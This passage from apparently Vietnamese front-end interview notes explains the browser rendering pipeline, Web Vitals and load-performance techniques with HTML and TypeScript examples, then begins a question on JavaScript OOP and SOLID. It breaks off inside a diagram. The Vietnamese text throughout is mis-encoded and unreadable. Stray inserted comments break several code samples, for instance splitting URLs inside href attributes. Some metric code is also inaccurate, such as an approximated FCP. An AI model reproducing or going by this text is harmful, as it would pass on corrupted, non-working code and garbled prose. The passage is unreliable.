   - **‚ö†Ô∏è Render-blocking**: Ph·∫£i ƒë·ª£i t·∫•t c·∫£ CSS load xong m·ªõi render
   - **Ch√∫ th√≠ch**: Chu·∫©n b·ªã gia v·ªã v√† c√°ch trang tr√≠ m√≥n ƒÉn

9. **JavaScript Execution** - ~100-2000ms
   ```javascript
   // Khi g·∫∑p <script src="app.js">
   // 1. Download app.js (n·∫øu external)
 // Ch√∫ gi·∫£i: 2. Parse & Compile JS
   // 3. Execute code (c√≥ th·ªÉ modify DOM/CSSOM)
   ```
   - **‚ö†Ô∏è Parser-blocking**: `<script>` ch·∫∑n HTML parsing
   - **‚úÖ async/defer**: Kh√¥ng ch·∫∑n parsing
     - `async`: Download parallel, execute ngay khi xong (kh√¥ng ƒë·∫£m b·∫£o th·ª© t·ª±)
     - `defer`: Download parallel, execute sau khi HTML parse xong (ƒë·∫£m b·∫£o th·ª© t·ª±)
   - **Ch√∫ th√≠ch**: Th√™m h√†nh ƒë·ªông ƒë·∫∑c bi·ªát v√†o m√≥n ƒÉn (vd: flambe)

**üñºÔ∏è PHASE 3: RENDERING (V·∫Ω l√™n m√†n h√¨nh) - Critical Rendering Path**

10. **Render Tree Construction** - ~50-200ms

    ```
    DOM + CSSOM ‚Üí Render Tree

    Render Tree ch·ªâ ch·ª©a:
    - Visible elements (kh√¥ng c√≥ display: none)
    - V·ªõi computed styles (font, color, position...)
    ```

    - K·∫øt h·ª£p DOM + CSSOM
    - Lo·∫°i b·ªè invisible nodes (`display: none`, `<head>`, `<script>`)
    - **Ch√∫ th√≠ch**: S·∫Øp x·∫øp m√≥n ƒÉn l√™n ƒëƒ©a theo c√°ch ƒë·∫πp m·∫Øt

11. **Layout (Reflow)** - ~50-500ms

    ```
    T√≠nh to√°n:
    - V·ªã tr√≠ (x, y) c·ªßa m·ªói element
    - K√≠ch th∆∞·ªõc (width, height)
    - Box model (margin, padding, border)
    ```

    - Browser t√≠nh to√°n **geometry** (h√¨nh h·ªçc) c·ªßa m·ªói element
    - **‚ö†Ô∏è Expensive**: Thay ƒë·ªïi layout triggers reflow to√†n b·ªô tree
    - **Ch√∫ th√≠ch**: ƒêo k√≠ch th∆∞·ªõc v√† v·ªã tr√≠ t·ª´ng th√†nh ph·∫ßn tr√™n ƒëƒ©a

12. **Paint & Composite** - ~50-200ms
    - **Paint**: Chuy·ªÉn elements th√†nh pixels (fill colors, draw text, images...)
    - **Composite**: K·∫øt h·ª£p c√°c layers th√†nh final image
    - GPU acceleration cho `transform`, `opacity`
    - **Ch√∫ th√≠ch**: V·∫Ω m√≥n ƒÉn l√™n gi·∫•y v√† gh√©p c√°c l·ªõp l·∫°i th√†nh h√¨nh ho√†n ch·ªânh

**üéØ Total Time: ~800ms - 5000ms** (ph·ª• thu·ªôc network, server, complexity)

**Ho·∫°t ƒë·ªông:**

**üìä Timeline minh h·ªça:**

```
Time ‚Üí  0ms          200ms        400ms        600ms        800ms       1000ms
        ‚îÇ             ‚îÇ            ‚îÇ            ‚îÇ            ‚îÇ            ‚îÇ
DNS     ‚ñà‚ñà‚ñà‚ñà
TCP         ‚ñà‚ñà‚ñà‚ñà‚ñà
TLS              ‚ñà‚ñà‚ñà‚ñà
Request               ‚ñà‚ñà
Server                  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà
Response                            ‚ñà‚ñà‚ñà‚ñà
HTML Parse                              ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà
CSS Parse                                   ‚ñà‚ñà‚ñà‚ñà
JS Exec                                         ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà
Layout                                                 ‚ñà‚ñà‚ñà
Paint                                                     ‚ñà‚ñà
        ‚îÇ             ‚îÇ            ‚îÇ            ‚îÇ            ‚îÇ            ‚îÇ
        ‚îî‚îÄ NETWORK ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ PARSING ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ RENDERING ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

**üî• Critical Rendering Path (Con ƒë∆∞·ªùng render quan tr·ªçng):**

```
HTML ‚Üí DOM Tree ‚îÄ‚îê
                  ‚îú‚îÄ‚Üí Render Tree ‚Üí Layout ‚Üí Paint ‚Üí Composite ‚Üí Display
CSS ‚Üí CSSOM Tree ‚îÄ‚îò
        ‚Üë
        ‚îÇ
    JS c√≥ th·ªÉ modify DOM/CSSOM (triggering reflow/repaint)
```

---

**∆Øu ƒëi·ªÉm:**

1. **Efficient Pipeline**: Browser optimize m·ªói b∆∞·ªõc ƒë·ªÉ render nhanh nh·∫•t
2. **Progressive Rendering**: Browser render t·ª´ng ph·∫ßn khi c√≥ data (kh√¥ng ƒë·ª£i full page load)
3. **Caching**: DNS, TCP connections, assets ƒë∆∞·ª£c cache ƒë·ªÉ l·∫ßn sau nhanh h∆°n
4. **Parallel Processing**: Browser download multiple resources ƒë·ªìng th·ªùi (HTTP/2, HTTP/3)
5. **GPU Acceleration**: D√πng GPU cho animations (`transform`, `opacity`) thay v√¨ CPU

---

**Nh∆∞·ª£c ƒëi·ªÉm:**

1. **Render-blocking CSS**: Ph·∫£i load h·∫øt CSS m·ªõi render ‚Üí tƒÉng FCP (First Contentful Paint)
2. **Parser-blocking JS**: `<script>` ch·∫∑n HTML parsing ‚Üí delay DOM construction
3. **Network Latency**: M·ªói RTT (Round-Trip Time) th√™m ~100-300ms delay
4. **Reflow/Repaint Expensive**: Thay ƒë·ªïi layout trigger reflow to√†n b·ªô page
5. **Third-party Scripts**: Ads, analytics l√†m ch·∫≠m page load

---

**Ch√∫ th√≠ch:**

**üéØ C√°c metrics quan tr·ªçng (Web Vitals):**

- **FCP (First Contentful Paint)**: Th·ªùi gian browser render first content (~1-2s)
- **LCP (Largest Contentful Paint)**: Th·ªùi gian render largest content (~2-3s)
- **TTI (Time to Interactive)**: Th·ªùi gian page c√≥ th·ªÉ t∆∞∆°ng t√°c (~3-5s)
- **CLS (Cumulative Layout Shift)**: ƒêo l∆∞·ªùng layout shift (< 0.1 l√† t·ªët)
- **FID (First Input Delay)**: Delay t·ª´ khi user click ƒë·∫øn khi browser respond (< 100ms)

**‚ö° Optimization techniques:**

1. **DNS Prefetch**: `<link rel="dns-prefetch" href=" // Ch√∫ gi·∫£i: api.example.com">`
2. **Preconnect**: `<link rel="preconnect" href=" // Ch√∫ gi·∫£i: cdn.example.com">`
3. **Resource Hints**: `<link rel="preload" as="script" href="critical.js">`
4. **Critical CSS**: Inline critical CSS, defer non-critical
5. **Async/Defer JS**: `<script async src="analytics.js">`
6. **Code Splitting**: Load only needed code first
7. **Image Optimization**: WebP, lazy loading, responsive images
8. **CDN**: Serve static assets from edge locations closer to users
9. **HTTP/2 or HTTP/3**: Multiplexing, server push
10. **Service Worker**: Cache assets for offline/fast subsequent loads

---

**Code Example:**

**üîç V√≠ d·ª• 1: Waterfall Network Requests (Sequential loading - SLOW)**

```html
<!DOCTYPE html>
<html>
  <head>
    <!-- ‚ùå BAD: Blocking CSS -->
    <link rel="stylesheet" href="styles.css" />
    <!-- Wait 200ms -->

    <!-- ‚ùå BAD: Parser-blocking script -->
    <script src="jquery.js"></script>
    <!-- Wait 300ms, blocks HTML parsing -->
    <script src="app.js"></script>
    <!-- Wait 200ms, blocks HTML parsing -->
  </head>
  <body>
    <h1>Hello World</h1>

    <!-- ‚ùå BAD: Synchronous image loading -->
    <img src="hero.jpg" width="1200" height="600" />
    <!-- Wait 500ms -->
  </body>
</html>

<!--
Total blocking time: 200 + 300 + 200 = 700ms
FCP: ~900ms (after styles.css + scripts loaded)
‚ùå User sees blank white screen for ~900ms
-->
```

**‚úÖ V√≠ d·ª• 2: Optimized Loading (Parallel + Progressive - FAST)**

```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <!-- ‚úÖ GOOD: DNS prefetch for external domains -->
    <link rel="dns-prefetch" href=" // Ch√∫ gi·∫£i: api.example.com" />
    <link rel="preconnect" href=" // Ch√∫ gi·∫£i: cdn.example.com" crossorigin />

    <!-- ‚úÖ GOOD: Inline critical CSS (above-the-fold styles) -->
    <style>
      /* Critical CSS: ch·ªâ styles cho n·ªôi dung ƒë·∫ßu trang */
      body {
        margin: 0;
        font-family: sans-serif;
      }
      .hero {
        height: 100vh;
        background: #f0f0f0;
      }
      h1 {
        font-size: 3rem;
      }
    </style>

    <!-- ‚úÖ GOOD: Preload critical resources -->
    <link rel="preload" as="font" href="/fonts/main.woff2" crossorigin />
    <link rel="preload" as="image" href="/hero.webp" />

    <!-- ‚úÖ GOOD: Defer non-critical CSS -->
    <link
      rel="preload"
      as="style"
      href="styles.css"
      onload="this.onload=null;this.rel='stylesheet'"
    />
    <noscript><link rel="stylesheet" href="styles.css" /></noscript>
  </head>
  <body>
    <div class="hero">
      <h1>Hello World</h1>

      <!-- ‚úÖ GOOD: Responsive images with lazy loading -->
      <img
        src="hero-small.webp"
        srcset="
          hero-small.webp   400w,
          hero-medium.webp  800w,
          hero-large.webp  1200w
        "
        sizes="100vw"
        loading="lazy"
        decoding="async"
        alt="Hero image"
      />
    </div>

    <!-- ‚úÖ GOOD: Defer non-critical scripts -->
    <script src="jquery.js" defer></script>
    <script src="app.js" defer></script>

    <!-- ‚úÖ GOOD: Async third-party scripts -->
    <script async src="https: // Ch√∫ gi·∫£i: analytics.com/script.js"></script>
  </body>
</html>

<!--
Critical CSS inline: 0ms blocking
Images lazy load: kh√¥ng block render
Scripts defer: download parallel, execute after DOM ready
‚úÖ FCP: ~200-400ms (user sees content immediately!)
-->
```

**üîç V√≠ d·ª• 3: Measuring Performance v·ªõi Performance API**

```typescript
// ƒêo c√°c Web Vitals metrics
interface PerformanceMetrics {
  dns: number;
  tcp: number;
  request: number;
  response: number;
  domParse: number;
  domReady: number;
  load: number;
  fcp: number;
  lcp: number;
}

function measurePerformance(): PerformanceMetrics {
  const perfData = performance.timing;
  const navigation = performance.getEntriesByType(
    'navigation'
  )[0] as PerformanceNavigationTiming;

  return {
 // Ch√∫ gi·∫£i: Network metrics
    dns: perfData.domainLookupEnd - perfData.domainLookupStart,
    tcp: perfData.connectEnd - perfData.connectStart,
    request: perfData.responseStart - perfData.requestStart,
    response: perfData.responseEnd - perfData.responseStart,

 // Ch√∫ gi·∫£i: Parsing metrics
    domParse: perfData.domInteractive - perfData.domLoading,
    domReady: perfData.domContentLoadedEventEnd - perfData.navigationStart,
    load: perfData.loadEventEnd - perfData.navigationStart,

 // Ch√∫ gi·∫£i: Web Vitals (approximate)
    fcp: navigation.responseStart - navigation.fetchStart,
    lcp: 0, // C·∫ßn d√πng PerformanceObserver
  };
}

 // Ch√∫ gi·∫£i: Observe LCP (Largest Contentful Paint)
const observer = new PerformanceObserver((list) => {
  const entries = list.getEntries();
  const lastEntry = entries[entries.length - 1] as PerformanceEntry & {
    renderTime: number;
  };

  console.log('LCP:', lastEntry.renderTime || lastEntry.startTime);
});

observer.observe({ entryTypes: ['largest-contentful-paint'] });

 // Ch√∫ gi·∫£i: Log metrics after page load
window.addEventListener('load', () => {
  setTimeout(() => {
    const metrics = measurePerformance();
    console.table(metrics);

    /* Example output:
    ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
    ‚îÇ  Metric   ‚îÇ Time   ‚îÇ
    ‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
    ‚îÇ dns       ‚îÇ 45ms   ‚îÇ
    ‚îÇ tcp       ‚îÇ 123ms  ‚îÇ
    ‚îÇ request   ‚îÇ 87ms   ‚îÇ
    ‚îÇ response  ‚îÇ 234ms  ‚îÇ
    ‚îÇ domParse  ‚îÇ 456ms  ‚îÇ
    ‚îÇ domReady  ‚îÇ 789ms  ‚îÇ
    ‚îÇ load      ‚îÇ 1234ms ‚îÇ
    ‚îÇ fcp       ‚îÇ 567ms  ‚îÇ
    ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
    */
  }, 0);
});
```

**üîç V√≠ d·ª• 4: T·ªëi ∆Øu Critical Rendering Path trong Trading App**

```typescript
 // Ch√∫ gi·∫£i: ‚ùå BAD: Load t·∫•t c·∫£ chart libraries upfront
import { Chart } from 'chart.js'; // Ch√∫ gi·∫£i: 200KB
import { TradingView } from 'tradingview'; // Ch√∫ gi·∫£i: 500KB
import { DataGrid } from 'ag-grid'; // Ch√∫ gi·∫£i: 300KB

class TradingApp {
  async init() {
 // Ch√∫ gi·∫£i: Load all libs ‚Üí 1000KB ‚Üí 3-5s load time!
    this.chart = new Chart();
    this.tradingView = new TradingView();
    this.grid = new DataGrid();
  }
}

 // Ch√∫ gi·∫£i: ‚úÖ GOOD: Code splitting + Lazy loading
class TradingAppOptimized {
  private chart?: any;
  private tradingView?: any;
  private grid?: any;

  async init() {
 // Ch√∫ gi·∫£i: Load critical UI first (header, sidebar)
    this.renderCriticalUI();

 // Ch√∫ gi·∫£i: Lazy load chart when needed
    this.loadChartLazy();
  }

  renderCriticalUI() {
 // Ch√∫ gi·∫£i: Inline critical CSS
    document.head.insertAdjacentHTML(
      'beforeend',
      `
      <style>
        .header { /* critical styles */ }
        .sidebar { /* critical styles */ }
      </style>
    `
    );

 // Ch√∫ gi·∫£i: Render skeleton UI immediately
    document.body.innerHTML = `
      <div class="header">Trading Platform</div>
      <div class="sidebar">Menu...</div>
      <div id="chart-container">
        <div class="skeleton-loader"></div>
      </div>
    `;
  }

  async loadChartLazy() {
 // Ch√∫ gi·∫£i: Dynamic import: ch·ªâ load khi c·∫ßn
    const { Chart } = await import(
      /* webpackChunkName: "chart" */
      /* webpackPrefetch: true */
      'chart.js'
    );

    this.chart = new Chart();
    this.renderChart();
  }

 // Ch√∫ gi·∫£i: Lazy load trading view ch·ªâ khi user click tab
  async loadTradingView() {
    if (!this.tradingView) {
      const { TradingView } = await import('tradingview');
      this.tradingView = new TradingView();
    }
    return this.tradingView;
  }
}

// Resource hints ƒë·ªÉ pre-load chunks
document.head.insertAdjacentHTML(
  'beforeend',
  `
  <link rel="prefetch" href="/chunks/chart.js">
  <link rel="preload" as="script" href="/critical.js">
`
);

/*
üìä K·∫øt qu·∫£:
‚ùå BAD:
  - Bundle size: 1000KB
  - FCP: 3-5s
  - TTI: 5-7s

‚úÖ GOOD:
  - Initial bundle: 100KB
  - FCP: 500ms-1s
  - TTI: 1-2s
  - Load chart.js khi c·∫ßn: +200ms
*/
```

---

**Best Practices:**

```typescript
 // Ch√∫ gi·∫£i: ‚úÖ DO: Optimize Critical Rendering Path

 // Ch√∫ gi·∫£i: 1. Minimize Critical Resources
 // Ch√∫ gi·∫£i: - Inline critical CSS (above-the-fold)
 // Ch√∫ gi·∫£i: - Defer non-critical CSS
 // Ch√∫ gi·∫£i: - Async/defer non-critical JS

 // Ch√∫ gi·∫£i: 2. Reduce Number of Critical Bytes
 // Ch√∫ gi·∫£i: - Minify HTML/CSS/JS
 // Ch√∫ gi·∫£i: - Compress with Gzip/Brotli
 // Ch√∫ gi·∫£i: - Remove unused code (tree-shaking)

 // Ch√∫ gi·∫£i: 3. Optimize Critical Path Length
 // Ch√∫ gi·∫£i: - Reduce redirects
 // Ch√∫ gi·∫£i: - Use CDN
 // Ch√∫ gi·∫£i: - HTTP/2 multiplexing
 // Ch√∫ gi·∫£i: - Preconnect to required origins

 // Ch√∫ gi·∫£i: 4. Resource Hints
<link rel="dns-prefetch" href=" // Ch√∫ gi·∫£i: api.example.com">
<link rel="preconnect" href=" // Ch√∫ gi·∫£i: cdn.example.com">
<link rel="prefetch" href="/next-page.js">
<link rel="preload" as="script" href="/critical.js">

 // Ch√∫ gi·∫£i: 5. Code Splitting
const ChartComponent = lazy(() => import('./Chart'));

 // Ch√∫ gi·∫£i: 6. Image Optimization
<img
  src="image.webp"
  loading="lazy"
  decoding="async"
  srcset="small.webp 400w, large.webp 1200w"
>

 // Ch√∫ gi·∫£i: 7. Service Worker for Caching
if ('serviceWorker' in navigator) {
  navigator.serviceWorker.register('/sw.js');
}

 // Ch√∫ gi·∫£i: 8. Measure & Monitor
const observer = new PerformanceObserver((list) => {
  for (const entry of list.getEntries()) {
    console.log('LCP:', entry.renderTime || entry.startTime);

 // Ch√∫ gi·∫£i: Send to analytics
    sendToAnalytics({
      metric: 'lcp',
      value: entry.renderTime || entry.startTime,
      url: window.location.href
    });
  }
});

observer.observe({ entryTypes: ['largest-contentful-paint'] });
```

---

**Common Mistakes:**

```typescript
 // Ch√∫ gi·∫£i: ‚ùå MISTAKE 1: Render-blocking CSS
<link rel="stylesheet" href="styles.css">
// Browser ph·∫£i download + parse CSS tr∆∞·ªõc khi render b·∫•t c·ª© g√¨!

 // Ch√∫ gi·∫£i: ‚úÖ FIX: Inline critical CSS, defer rest
<style>/* inline critical CSS */</style>
<link rel="preload" as="style" href="styles.css"
      onload="this.rel='stylesheet'">

 // Ch√∫ gi·∫£i: ‚ùå MISTAKE 2: Parser-blocking scripts
<script src="app.js"></script>
// Ch·∫∑n HTML parsing!

 // Ch√∫ gi·∫£i: ‚úÖ FIX: Defer scripts
<script src="app.js" defer></script>

// ‚ùå MISTAKE 3: Kh√¥ng optimize images
<img src="huge-image.jpg"> <!-- 5MB image! -->

 // Ch√∫ gi·∫£i: ‚úÖ FIX: Responsive images + lazy loading
<img
  src="small.webp"
  srcset="small.webp 400w, large.webp 1200w"
  sizes="(max-width: 600px) 400px, 1200px"
  loading="lazy"
  decoding="async"
>

// ‚ùå MISTAKE 4: Qu√° nhi·ªÅu synchronous requests
fetch('/api/user');
fetch('/api/orders');
fetch('/api/positions');
 // Ch√∫ gi·∫£i: Sequential ‚Üí ~3s total

 // Ch√∫ gi·∫£i: ‚úÖ FIX: Parallel requests
Promise.all([
  fetch('/api/user'),
  fetch('/api/orders'),
  fetch('/api/positions')
]);
 // Ch√∫ gi·∫£i: Parallel ‚Üí ~1s total

 // Ch√∫ gi·∫£i: ‚ùå MISTAKE 5: Layout thrashing
for (let i = 0; i < 100; i++) {
  const height = element.offsetHeight; // Ch√∫ gi·∫£i: Read (trigger layout)
  element.style.height = height + 10 + 'px'; // Ch√∫ gi·∫£i: Write (trigger reflow)
}
 // Ch√∫ gi·∫£i: 100 reflows! R·∫•t ch·∫≠m!

 // Ch√∫ gi·∫£i: ‚úÖ FIX: Batch reads/writes
const heights = [];
for (let i = 0; i < 100; i++) {
  heights.push(element.offsetHeight); // Ch√∫ gi·∫£i: Read all
}
for (let i = 0; i < 100; i++) {
  element.style.height = heights[i] + 10 + 'px'; // Ch√∫ gi·∫£i: Write all
}
 // Ch√∫ gi·∫£i: Ch·ªâ 1 reflow!

// ‚ùå MISTAKE 6: Kh√¥ng measure performance
// L√†m sao bi·∫øt optimize c√≥ hi·ªáu qu·∫£?

 // Ch√∫ gi·∫£i: ‚úÖ FIX: Monitor Web Vitals
import { getCLS, getFID, getFCP, getLCP, getTTFB } from 'web-vitals';

getCLS(console.log);
getFID(console.log);
getFCP(console.log);
getLCP(console.log);
getTTFB(console.log);
```

---

**üìã T√≥m t·∫Øt 12 B∆∞·ªõc t·ª´ URL ‚Üí UI:**

```
1. DNS Lookup       ‚Üí Resolve domain ‚Üí IP
2. TCP Handshake    ‚Üí Establish connection (SYN, SYN-ACK, ACK)
3. TLS Handshake    ‚Üí Secure connection (HTTPS)
4. HTTP Request     ‚Üí Browser ‚Üí Server
5. Server Process   ‚Üí Generate response
6. HTTP Response    ‚Üí Server ‚Üí Browser (HTML)
7. HTML Parse       ‚Üí DOM Tree
8. CSS Parse        ‚Üí CSSOM Tree
9. JS Execution     ‚Üí Modify DOM/CSSOM (n·∫øu c√≥)
10. Render Tree     ‚Üí DOM + CSSOM = Render Tree
11. Layout          ‚Üí T√≠nh to√°n v·ªã tr√≠ & k√≠ch th∆∞·ªõc
12. Paint+Composite ‚Üí V·∫Ω pixels l√™n m√†n h√¨nh ‚Üí ‚úÖ USER SEES UI!
```

**üéØ Critical Rendering Path:** `HTML ‚Üí DOM + CSS ‚Üí CSSOM = Render Tree ‚Üí Layout ‚Üí Paint`

**‚ö° T·ªëi ∆∞u:** Minimize critical resources, reduce bytes, optimize path length!

---
---
## 37. üèõÔ∏è Q37: OOP (Object-Oriented Programming) trong JavaScript - Classes, Inheritance, Encapsulation & SOLID Principles?  

**P1: T√™n c√¢u h·ªèi:** üèõÔ∏è Q37: OOP (Object-Oriented Programming) trong JavaScript - Classes, Inheritance, Encapsulation & SOLID Principles?  

**P2: Tr·∫£ l·ªùi (Senior):**

## **‚≠ê T√ìM T·∫ÆT CHO PH·ªéNG V·∫§N SENIOR/STAFF**

### **üéØ C√¢u Tr·∫£ L·ªùi Ng·∫Øn G·ªçn (4-5 ph√∫t):**

**"OOP trong JS bao g·ªìm Classes (ES6 sugar tr√™n prototypes), Encapsulation (#private fields), Inheritance (extends), Polymorphism (override methods), + SOLID principles ƒë·ªÉ thi·∫øt k·∫ø maintainable code."**

**üîë 5 Pillars c·ªßa OOP:**

**1. Classes (L·ªõp):**
- **Blueprint** ƒë·ªÉ t·∫ßo objects: `class User { constructor(name) {...} }`
- **Syntactic sugar** tr√™n prototype-based inheritance
- Methods t·ª± ƒë·ªông **non-enumerable**, kh√°c function constructors

**2. Encapsulation (ƒê√≥ng g√≥i):**
- **Private fields**: `#balance` - truly private (ES2022), kh√¥ng access t·ª´ ngo√†i
- **Public API**: Ch·ªâ expose c·∫ßn thi·∫øt (`getBalance()`, `deposit()`)
- Protect implementation details, prevent invalid state

**3. Inheritance (K·∫ø th·ª´a):**
- `class Admin extends User` - **"is-a" relationship**
- `super()` b·∫Øt bu·ªôc trong constructor, `super.method()` g·ªçi parent
- Prototype chain: `admin.__proto__` ‚Üí `Admin.prototype` ‚Üí `User.prototype` ‚Üí `Object.prototype`

**4. Polymorphism (ƒêa h√¨nh):**
- **Override methods**: `Admin.login()` kh√°c `User.login()`
- C√πng interface, behavior kh√°c nhau
- Duck typing: "If it walks like a duck..."

**5. Composition (K·∫øt h·ª£p):**
- **"Has-a" relationship** - inject dependencies
- `class UserService { constructor(logger, db) {...} }`
- **Prefer over Inheritance** - flexible, loosely coupled

**üîë SOLID Principles:**

- **S**ingle Responsibility: 1 class = 1 nhi·ªám v·ª•
- **O**pen/Closed: M·ªü r·ªông, ƒë√≥ng s·ª≠a ƒë·ªïi (extend, kh√¥ng modify existing)
- **L**iskov Substitution: Subclass thay th·∫ø parent kh√¥ng break code
- **I**nterface Segregation: Nhi·ªÅu interfaces nh·ªè > 1 interface l·ªõn
- **D**ependency Inversion: Depend on abstractions, not concretions (inject)

**‚ö†Ô∏è L·ªói Th∆∞·ªùng G·∫∑p:**
- Qu√™n `super()` trong child constructor ‚Üí ReferenceError
- D√πng `_privateField` (convention) nh∆∞ truly private ‚Üí v·∫´n access ƒë∆∞·ª£c, d√πng `#` thay v√¨
- **Deep inheritance chains** (>3 levels) ‚Üí fragile, hard maintain
- Pass methods as callbacks kh√¥ng bind `this` ‚Üí `this` = undefined

**üí° Ki·∫øn Th·ª©c Senior:**
- **Composition > Inheritance**: Avoid "gorilla-banana problem" (mu·ªën banana nh∆∞ng nh·∫≠n c·∫£ gorilla + jungle)
- **Mixins**: `Object.assign(MyClass.prototype, Loggable, Serializable)` - multiple behaviors
- **Static methods** for factories: `User.fromJSON(json)`, `Array.from()`
- **Private class fields** (#) kh√¥ng inherit (kh√°c public properties)
- Modern approach: **Functional programming** + **Hooks** (React) thay classes




**Tr·∫£ l·ªùi:****
OOP (L·∫≠p tr√¨nh H∆∞·ªõng ƒê·ªëi T∆∞·ª£ng) l√† **paradigm l·∫≠p tr√¨nh** d·ª±a tr√™n **objects** (ƒë·ªëi t∆∞·ª£ng) ch·ª©a:

- **Data** (d·ªØ li·ªáu) ‚Üí properties/fields (thu·ªôc t√≠nh)
- **Behavior** (h√†nh vi) ‚Üí methods (ph∆∞∆°ng th·ª©c)

JavaScript h·ªó tr·ª£ OOP th√¥ng qua 5 concepts ch√≠nh:

1. **Classes (L·ªõp)** - ES6+

   - L√† "b·∫£n thi·∫øt k·∫ø" (blueprint) ƒë·ªÉ t·∫°o objects
   - Syntactic sugar cho prototype-based inheritance
   - **V√≠ d·ª•**: `class User { ... }` ‚Üí t·∫°o ra nhi·ªÅu user objects

2. **Encapsulation (ƒê√≥ng g√≥i)**

   - ·∫®n implementation details (chi ti·∫øt tri·ªÉn khai) b√™n trong class
   - Ch·ªâ expose ra public API c·∫ßn thi·∫øt
   - D√πng **private fields** (`#fieldName`) ƒë·ªÉ b·∫£o v·ªá data
   - **V√≠ d·ª•**: `#balance` trong BankAccount kh√¥ng th·ªÉ truy c·∫≠p t·ª´ b√™n ngo√†i

3. **Inheritance (K·∫ø th·ª´a)**

   - Class con (child) k·∫ø th·ª´a properties/methods t·ª´ class cha (parent)
   - T√°i s·ª≠ d·ª•ng code, tr√°nh duplication
   - D√πng keyword `extends`
   - **V√≠ d·ª•**: `Admin extends User` ‚Üí Admin c√≥ t·∫•t c·∫£ methods c·ªßa User + th√™m methods ri√™ng

4. **Polymorphism (ƒêa h√¨nh)**

   - Subclass c√≥ th·ªÉ override (ghi ƒë√®) methods c·ªßa parent
   - C√πng method name nh∆∞ng behavior kh√°c nhau
   - **V√≠ d·ª•**: `Admin.login()` kh√°c `User.login()` (Admin c√≥ th√™m audit log)

5. **Composition (K·∫øt h·ª£p)**
   - "Has-a" relationship thay v√¨ "Is-a" (inheritance)
   - Inject dependencies v√†o class thay v√¨ k·∫ø th·ª´a
   - **∆Øu ti√™n h∆°n Inheritance** (Composition > Inheritance)
   - **V√≠ d·ª•**: `UserService` c√≥ `logger` v√† `emailService` (inject v√†o) thay v√¨ k·∫ø th·ª´a t·ª´ Logger

**üéØ SOLID Principles (5 nguy√™n t·∫Øc thi·∫øt k·∫ø OOP):**

- **S**ingle Responsibility: 1 class ch·ªâ l√†m 1 vi·ªác
- **O**pen/Closed: M·ªü cho m·ªü r·ªông, ƒë√≥ng cho s·ª≠a ƒë·ªïi
- **L**iskov Substitution: Subclass thay th·∫ø ƒë∆∞·ª£c parent
- **I**nterface Segregation: Interfaces nh·ªè, t·∫≠p trung
- **D**ependency Inversion: Ph·ª• thu·ªôc v√†o abstractions, kh√¥ng ph·∫£i concretions

**Ho·∫°t ƒë·ªông:**

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ              OOP Concepts Flow                           ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ                                                          ‚îÇ
‚îÇ  1. CLASS DEFINITION (Blueprint)                        ‚îÇ
‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê                ‚îÇ
‚îÇ  ‚îÇ class User {                        ‚îÇ                ‚îÇ
‚îÇ  ‚îÇ   #password // Tr∆∞·ªùng private (v√≠ d·ª• `#field`) ch·ªâ truy c·∫≠p ƒë∆∞·ª£c trong class, kh√¥ng th·ªÉ truy c·∫≠p t·ª´ b√™n ngo√†i. Tr∆∞·ªùng private b·∫Øt ƒë·∫ßu b·∫±ng `#` ch·ªâ c√≥ th·ªÉ truy c·∫≠p trong class, g√¢y l·ªói khi truy c·∫≠p ngo√†i.
